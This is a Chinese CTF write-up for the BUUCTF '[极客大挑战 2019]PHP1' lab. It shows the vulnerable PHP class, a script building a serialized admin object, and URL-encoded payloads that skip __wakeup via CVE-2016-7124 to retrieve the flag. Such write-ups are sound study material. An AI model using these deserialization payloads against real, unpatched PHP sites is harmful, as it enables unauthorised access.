---
{"dg-publish":true,"title":"BUU_[极客大挑战 2019]PHP1","dg-path":"安全/靶场/BUU_[极客大挑战 2019]PHP1.md","permalink":"/安全/靶场/BUU_[极客大挑战 2019]PHP1/","dgPassFrontmatter":true}
---

这一题的主要考点是**PHP反序列化**
但是这都不是重点
重点是**猫猫可爱捏**
![Pasted image 20241008160503.png](/img/user/picture/Pasted%20image%2020241008160503.png)

首先给了我们一个信息，那就是这个网站存在备份，我们下载一下备份
`www.zip`(用工具扫一下就能扫出来)


在`index.php`中有一段php代码：
![Pasted image 20241008161408.png](/img/user/picture/Pasted%20image%2020241008161408.png)
也就是GET接收`select` 变量，在对其进行反序列化

主体在`class.php`中，我们看一下：
```php
<?php
include 'flag.php';


error_reporting(0);


class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```

我们构建：
```php
<?php  
  
class Name{  
    private $username = 'admin';  
    private $password = '100';  
      
}  
  
$a=new Name();  
echo serialize($a);  
?>
```
![Pasted image 20241008163235.png](/img/user/picture/Pasted%20image%2020241008163235.png)
注意要将里面那个方框乱码替换为`%00`
也就是：
```txt
O:4:%22Name%22:2:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;}
```

现在的输出情况：
![Pasted image 20241008163435.png](/img/user/picture/Pasted%20image%2020241008163435.png)

这里的原因是因为在反序列化的时候，会调用`__wakeup()`函数

解决这个问题可以利用漏洞`CVE-2016-7124`

+ 漏洞编号：CVE-2016-7124
+ 影响版本：PHP 5<5.6.25; PHP 7<7.0.10
+ 漏洞危害：如存在__wakeup方法，调用unserilize()方法前则先调用__wakeup方法，但序列化字符串中表示对象属性个数的值大于真实属性个数时会跳过__wakeup执行


我们查看一下PHP版本，发现在影响版本里面
![Pasted image 20241008163740.png](/img/user/picture/Pasted%20image%2020241008163740.png)

我们只需要简单修改一下payload即可：
```txt
O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;s:3:%22100%22;}
```

flag就拿到了：
![Pasted image 20241008163841.png](/img/user/picture/Pasted%20image%2020241008163841.png)
